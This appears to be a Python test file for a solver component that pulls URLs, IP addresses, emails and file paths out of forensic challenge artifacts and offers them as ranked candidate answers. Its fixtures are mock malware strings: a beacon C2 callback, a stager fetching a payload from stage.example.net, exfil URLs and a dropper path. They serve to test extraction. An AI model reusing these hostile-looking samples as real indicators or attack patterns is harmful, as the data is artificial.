#!/usr/bin/env python3
"""The SHIPPED stated-shape tier of the proposer (solvers/common/propose.py, wave70/adapt-proposer-shape).

  .venv/bin/python tests/test_propose_stated_shape.py [-v]

An exact_text/json answer whose FIELD names a stated shape -- a url, a path, a domain, an email, an ipv4 --
that sits literally in the named member's bytes WITHOUT a `field: value` key is reached by neither the
literal-prefix pattern tier (ANS-...) nor the kv tier. `propose.stated_shape_options` scans for the shape the
field names and offers the distinct matches as evidence-ranked hypotheses. These checks pin it, and its
bright line: it is emitted ONLY through `labels.candidates` (never a plain value), it is bounded and scoped
per delivery (an accepted rank never answers another variant), and a field that names no shape -- or bytes
holding no match -- yields nothing (no guess). It must never widen the wrong-plain surface.
"""
import re
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "common"))
import propose  # noqa: E402
import labels   # noqa: E402

FAILS = []


def check(name, ok, detail=""):
    if not ok:
        FAILS.append(name)
    print(("ok   " if ok else "FAIL ") + name + ("" if ok or not detail else f"  [{str(detail)[:600]}]"), flush=True)


def vals(opts):
    return [v for _, v in opts]


def names(opts):
    return [n for n, _ in opts]


MD = "metadata-forensics"
SCRIPT = "script-analysis"
EXACT = {"kind": "exact_text", "syntax": "the full value"}


def q_text(field, question, lane_field=None, member="m.bin", kind="exact_text"):
    q = {"qid": field, "answer_id": field, "member": member, "artifact": member,
         "question": question, "answer_format": {"kind": kind, "syntax": "the full value"}}
    if lane_field is not None:
        q["field"] = lane_field
    return q


# ------------------------------------------------------------------ the two report gaps close first
c2_text = (b"[beacon]\njitter = 15\n"
           b"callback = https://cdn.delivery-metrics.io/collect/v3/ping\nsleep_seconds = 60\n")
qc2 = {"qid": "config-nbx-c2-url", "answer_id": "config-nbx-c2-url", "member": "beacon.nbx", "artifact": "beacon.nbx",
       "question": "Determine nbx.c2_url for beacon.nbx (the URL the beacon calls back to).",
       "answer_format": EXACT}
oc2 = propose.propose(qc2, {"beacon.nbx": c2_text}, MD)
check("md_c2_url: the callback URL is the first (and only) candidate",
      vals(oc2)[:1] == ["https://cdn.delivery-metrics.io/collect/v3/ping"]
      and names(oc2)[0] == "only_url:beacon.nbx", oc2)

zph = (b'# Zephyr (.zph)\nstage fetch:\n    source <- "http://stage.example.net/payload/zephyr.bin"\n'
       b'    verb <- http.get(source)\n')
qurl = {"qid": "zephyr-stager-url", "answer_id": "zephyr-stager-url", "field": "stager_url",
        "member": "stager.zph", "artifact": "evidence.zip -> stager.zph",
        "question": "What URL does the stager.zph specimen download its payload from?",
        "answer_format": EXACT}
ourl = propose.propose(qurl, {"stager.zph": zph}, SCRIPT)
check("script_stager_url: the stager URL is the first candidate",
      vals(ourl)[:1] == ["http://stage.example.net/payload/zephyr.bin"], ourl)

# ------------------------------------------------------------------ NEVER PLAIN: only candidates_for
key = propose.key_for(MD, qc2)
cand = propose.candidates_for(qc2, {"beacon.nbx": c2_text}, key, MD)
check("NEVER-PLAIN: candidates_for returns an unsure ?? candidate pick", isinstance(cand, str)
      and cand.startswith("??") and labels.is_unsure(cand) and labels.is_candidate(cand), cand)
check("NEVER-PLAIN: no option NAME is the value itself (a name is a hypothesis)",
      all(("http" not in n and "@" != n) for n, _ in oc2 + ourl), names(oc2 + ourl))

# ------------------------------------------------------------------ an enum/label never gets a shape candidate
qrole = {"qid": "zephyr-stager-role", "answer_id": "zephyr-stager-role", "field": "role",
         "member": "stager.zph", "artifact": "evidence.zip -> stager.zph",
         "question": "What is the role of the stager.zph specimen?",
         "answer_format": {"kind": "enum", "syntax": "one of the listed roles",
                           "accepted_values": ["dropper", "downloader", "loader"]}}
orole = propose.stated_shape_options(qrole, {"stager.zph": zph}, SCRIPT)
check("enum role (even with 'stager' in the name): no URL candidate", orole == [], orole)

# a field that names NO shape, with a URL in the bytes: still nothing (the field does not ask for it)
qno = q_text("compression-scheme", "Determine the compression scheme used.", member="x.nvf")
ono = propose.stated_shape_options(qno, {"x.nvf": b"packed with http://x.example.com/lib marker"}, MD)
check("field names no shape: no candidate although a URL is present", ono == [], ono)

# a field that names a shape but the bytes hold no match: nothing (no guess)
qempty = q_text("c2_url", "Determine the c2_url callback.", member="e.bin")
oempty = propose.stated_shape_options(qempty, {"e.bin": b"no urls here, only text"}, MD)
check("shape named but no match in bytes: nothing (no guess)", oempty == [], oempty)

# ------------------------------------------------------------------ several matches -> scoped per delivery
two = b"a = http://first.example.com/a\nb = http://second.example.com/b\n"
qtwo = q_text("exfil-url", "Which exfil URL endpoint is used?", member="t.cfg")
otwo = propose.stated_shape_options(qtwo, {"t.cfg": two}, MD)
check("several matches: both offered, ranked, scoped per delivery (@<digest>#<n>, not only_)",
      len(otwo) == 2 and all("@" in n and n.endswith(("#1", "#2")) for n, _ in otwo)
      and vals(otwo) == ["http://first.example.com/a", "http://second.example.com/b"], otwo)
# the scope digest changes with the bytes, so an accepted rank cannot leak to a different variant
two_b = b"a = http://alpha.example.org/x\nb = http://beta.example.org/y\n"
otwo_b = propose.stated_shape_options(qtwo, {"t.cfg": two_b}, MD)
scope_a = {n.split("@", 1)[1].split("#", 1)[0] for n, _ in otwo}
scope_b = {n.split("@", 1)[1].split("#", 1)[0] for n, _ in otwo_b}
check("multi-match rank names are delivery-scoped (different bytes -> different digest)",
      scope_a and scope_b and scope_a.isdisjoint(scope_b), (scope_a, scope_b))

# ------------------------------------------------------------------ other shapes work (ipv4 / email / path)
qip = q_text("c2-ip", "What is the C2 ip address the host connects to?", member="h.bin")
oip = propose.stated_shape_options(qip, {"h.bin": b"connect 203.0.113.9:443 then 198.51.100.7"}, MD)
check("ipv4 shape: the addresses are found", vals(oip)[:2] == ["203.0.113.9", "198.51.100.7"], oip)
qmail = q_text("sender-email", "Which sender email address appears?", member="m.eml")
omail = propose.stated_shape_options(qmail, {"m.eml": b"From: evil@bad.example.net\nSubject: hi"}, MD)
check("email shape: the address is found", vals(omail)[:1] == ["evil@bad.example.net"], omail)
qpath = q_text("drop-path", "Which file path does the dropper write to?", member="d.bin")
opath = propose.stated_shape_options(qpath, {"d.bin": b'write "C:\\Users\\Public\\run.exe" now'}, MD)
check("path shape: the windows path is found", vals(opath)[:1] == ["C:\\Users\\Public\\run.exe"], opath)

# ------------------------------------------------------------------ bounded by MAX_OPTIONS
many = b"\n".join(b"http://h%d.example.com/p" % i for i in range(40))
qmany = q_text("beacon-url", "Which beacon callback URL is used?", member="m.cfg")
omany = propose.stated_shape_options(qmany, {"m.cfg": many}, MD)
check("bounded: never more than MAX_OPTIONS candidates", len(omany) <= propose.MAX_OPTIONS, len(omany))

# ------------------------------------------------------------------ is_stated_shape_name recognises the tier
check("is_stated_shape_name: recognises only_<shape> and <shape>@<digest>#<n>",
      propose.is_stated_shape_name("only_url:beacon.nbx") and propose.is_stated_shape_name("url@abc123#2")
      and not propose.is_stated_shape_name("kv:beacon.nbx") and not propose.is_stated_shape_name("only_in:m")
      and not propose.is_stated_shape_name("field:record_count"))



def test_all_checks_pass():
    """pytest entry: the module-level checks above ran at import; none may fail."""
    assert not FAILS, "failed checks: " + ", ".join(FAILS)


if __name__ == "__main__":
    print(f"\n{'PASS' if not FAILS else 'FAIL'} test_propose_stated_shape: {len(FAILS)} failed"
          + ("" if not FAILS else " " + ", ".join(FAILS)))
    sys.exit(1 if FAILS else 0)
